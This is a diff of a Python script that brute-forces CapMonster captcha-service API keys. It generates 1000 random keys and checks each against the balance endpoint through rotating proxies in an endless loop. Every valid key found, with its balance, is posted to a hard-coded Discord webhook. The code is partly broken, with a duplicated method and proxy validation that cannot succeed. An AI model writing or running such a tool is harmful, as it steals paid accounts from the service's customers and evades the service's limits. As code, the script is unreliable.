@@ -1,81 +1,171 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-"""
-@Author: github.com/imvast
-@Date: 2/5/2023
-"""
-import concurrent.futures
-import random
-import time
-import requests
+import httpx
 import os
+import random
+import string
+import time
+import json
+import concurrent.futures
+import logging
 
-user_agents = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
-    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
-    # ...
-]
-def add_random_delay(max_delay):
-    delay = random.uniform(4, max_delay)
-    time.sleep(delay)
-with open("proxies.txt","r+", encoding="utf-8") as f:
-    prox = [i.strip() for i in f.readlines()]
-    proxies = []
-    for i in prox:
-        if i != None and i != "":
-            proxies.append(i)
+GENERATED_KEYS_FILE = "keys.txt"
+PROXIES_FILE = "proxies.txt"
+WEBHOOK_URL = "https://discord.com/api/webhooks/k44R5vKMuqk9HUsD5vi_7aitXmOcR"
 
-def get_key():
-	with open("keys.txt", 'r') as f:
-		keys = [line.strip() for line in f.readlines()]
-	return keys
-            
-def worker(key, user_agent, proxy_type, proxy):
-	try:
-		response = requests.post("https://api.capmonster.cloud/getBalance", json={ "clientKey": key}, headers={'User-Agent': user_agent}, proxies={proxy_type: proxy}, timeout=5)
-		checkResp = response.json()
-		if response.status_code == 200:
-			balance = checkResp.get('balance')
-			print(f"[+] Valid Key: {key} | Balance: {balance}")
-		elif checkResp.get('errorCode') == "ERROR_KEY_DOES_NOT_EXIST":
-			print(f"[-] Invalid Key: {key}")
-		else:
-			print(f"[!] Error checking key: {key} | {response.status_code} | {checkResp}")
-			
-	except Exception as e:
-		print(f"[ERROR] Exception in worker -> {e}")
-		
-def main():
-	keys = get_key()
-	user_agent = random.choice(user_agents)
-	proxy = proxy = random.choice(proxies)
-	print("What Proxy to use(1-http, 2-https, 3-socks5)")
-	inp = int(input(":$"))
-	if inp == 1:
-		proxy_type = "http"
-		try:
-			with concurrent.futures.ThreadPoolExecutor() as executor:
-				futures = [executor.submit(worker, key, user_agent, proxy_type, proxy) for key in keys]
-		except:
-			os._exit(0)
-	elif inp == 2:
-		proxy_type = "https"
-		try:
-			with concurrent.futures.ThreadPoolExecutor() as executor:
-				futures = [executor.submit(worker, key, user_agent, proxy_type, proxy) for key in keys]
-		except KeyboardInterrupt:
-			os._exit(0)
-	elif inp == 3:
-		proxy_type = "socks5"
-		try:
-			with concurrent.futures.ThreadPoolExecutor() as executor:
-				futures = [executor.submit(worker, key, user_agent, proxy_type, proxy) for key in keys]
-		except KeyboardInterrupt:
-			os._exit(0)
-	else:
-		print(f"Error, something is wrong.")
+class CapMonsterChecker:
+    def __init__(self):
+        self.keys = []
+        self.use_proxies = False
+        self.proxies = []
+        self.logger = logging.getLogger("CapMonsterChecker")
+        self.logger.setLevel(logging.INFO)
+        formatter = logging.Formatter("[%(levelname)s] [%(asctime)s] - %(message)s")
+        ch = logging.StreamHandler()
+        ch.setFormatter(formatter)
+        self.logger.addHandler(ch)
+    
+    def generate_keys(self, num_keys, key_length):
+        chars = string.ascii_lowercase + string.digits
+        generated_keys = []
+        
+        for _ in range(num_keys):
+            key = ''.join(random.choice(chars) for _ in range(key_length))
+            generated_keys.append(key)
+        
+        return generated_keys
+    
+    def save_keys_to_file(self, keys):
+        with open(GENERATED_KEYS_FILE, 'w') as f:
+            for key in keys:
+                f.write(key + '\n')
+    
+    def load_keys_from_file(self):
+        if os.path.exists(GENERATED_KEYS_FILE):
+            with open(GENERATED_KEYS_FILE, 'r') as f:
+                self.keys = [line.strip() for line in f.readlines()]
+    
+    def load_proxies_from_file(self):
+        if os.path.exists(PROXIES_FILE):
+            with open(PROXIES_FILE, 'r') as f:
+                self.proxies = [line.strip() for line in f.readlines()]
+    
+    def ask_user_for_proxy_option(self):
+        answer = input("Do you want to use proxies? (y/n): ").lower()
+        self.use_proxies = answer.startswith('y')
+        if self.use_proxies:
+            self.load_proxies_from_file()  # Load proxies from the file
+    
+    def check_keys(self):
+        if not self.keys:
+            self.logger.warning("[!] No keys available. Generating new keys...")
+            self.generate_and_check_keys()
+            return
+
+        self.logger.info(f"[*] Starting checker with {len(self.keys)} keys...")
+
+        try:
+            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+                while True:
+                    futures = [executor.submit(self.check_key_with_retry, key, random.choice(self.proxies) if self.use_proxies else None)
+                               for key in self.keys]
+                    concurrent.futures.wait(futures, timeout=60)
+
+        except Exception as e:
+            self.logger.error(f"[ERROR] Exception in checker -> {e}")
+            time.sleep(60)  # Wait for 60 seconds before retrying
+
+    def check_key_with_retry(self, key, proxy, max_retries=3):
+        retries = 0
+        while retries < max_retries:
+            try:
+                self.check_key(key, proxy)
+                return
+            except httpx.TimeoutException:
+                self.logger.warning(f"Timeout while checking key {key}. Retrying... ({retries + 1}/{max_retries})")
+                retries += 1
+                time.sleep(5)  # Wait for 5 seconds before retrying
+        self.logger.error(f"Failed to check key {key} after {max_retries} retries.")
+
+    def check_key(self, key, proxy):
+        proxies = {"http": proxy, "https": proxy} if proxy else None
+        try:
+            checkResp = httpx.post(
+                "https://api.capmonster.cloud/getBalance",
+                json={"clientKey": key},
+                proxies=proxies,
+                timeout=30
+            )
+            if checkResp.status_code == 200:
+                balance = checkResp.json().get('balance')
+                if balance is not None:
+                    self.logger.info(f"Valid Key: {key} | Balance: {balance}")
+                    self.send_to_discord(key, balance)
+            elif checkResp.json().get('errorCode') == "ERROR_KEY_DOES_NOT_EXIST":
+                self.logger.info(f"Invalid Key: {key}")
+            else:
+                self.logger.error(f"Error checking key: {key} | {checkResp.status_code} | {checkResp.json()}")
+        except httpx.TimeoutException:
+            self.logger.error(f"Timeout while checking key {key}")
+        except Exception as e:
+            self.logger.error(f"Exception in checking key {key} -> {e}")
+
+    
+    def validate_proxies(self):
+        self.logger.info("Validating proxies...")
+        valid_proxies = []
+        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+            futures = [executor.submit(self.check_key, '', proxy) for proxy in self.proxies]
+            for future in concurrent.futures.as_completed(futures):
+                proxy = future.result()
+                if proxy:
+                    valid_proxies.append(proxy)
+        self.proxies = valid_proxies
+    
+    def check_keys(self):
+        if not self.keys:
+            self.logger.warning("[!] No keys available. Generating new keys...")
+            self.generate_and_check_keys()
+            return
+        
+        self.logger.info(f"[*] Starting checker with {len(self.keys)} keys...")
+        
+        try:
+            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+                while True:
+                    futures = [executor.submit(self.check_key, key, random.choice(self.proxies) if self.use_proxies else None)
+                               for key in self.keys]
+                    concurrent.futures.wait(futures, timeout=60)
+        
+        except Exception as e:
+            self.logger.error(f"[ERROR] Exception in checker -> {e}")
+            time.sleep(60)  # Wait for 60 seconds before retrying
+        
+    def generate_and_check_keys(self):
+        keys = self.generate_keys(1000, 32)  # Generate 1000 new keys
+        self.save_keys_to_file(keys)
+        self.load_keys_from_file()
+        self.ask_user_for_proxy_option()  # Ask the user for proxy option
+        if self.use_proxies:
+            self.validate_proxies()
+        self.check_keys()
+    
+    def send_to_discord(self, key, balance):
+        data = {
+            "content": f"Valid Key: {key} | Balance: {balance}"
+        }
+        headers = {
+            "Content-Type": "application/json"
+        }
+        
+        try:
+            response = httpx.post(WEBHOOK_URL, json.dumps(data), headers=headers)
+            if response.status_code == 204:
+                self.logger.info("Message sent to Discord webhook")
+            else:
+                self.logger.error(f"Error sending message to Discord webhook: {response.status_code} - {response.text}")
+        except Exception as e:
+            self.logger.error(f"Exception in sending to Discord: {e}")
 
 if __name__ == "__main__":
-    main()
-    
+    checker = CapMonsterChecker()
+    checker.load_keys_from_file()
+    checker.check_keys()
